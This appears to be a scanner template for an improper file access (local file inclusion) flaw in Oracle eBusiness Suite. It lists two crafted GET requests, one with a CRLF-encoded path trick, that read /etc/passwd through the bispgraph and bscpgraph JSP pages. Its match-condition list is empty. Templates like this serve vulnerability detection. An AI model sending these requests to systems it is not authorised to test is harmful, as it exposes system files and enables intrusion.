id: oracle-ebs-bispgrapgh-file-read
brief:
    title: Oracle eBusiness Suite - Improper File Access
    by: emenalf
    level: critical
    about: Oracle eBusiness Suite is susceptible to improper file access vulnerabilities via bispgrapgh. Be aware this product is no longer supported with patches or security fixes.
    label:
        - oracle
        - lfi
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/'
        - '{{BaseURL}}/OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd'
      signs: []
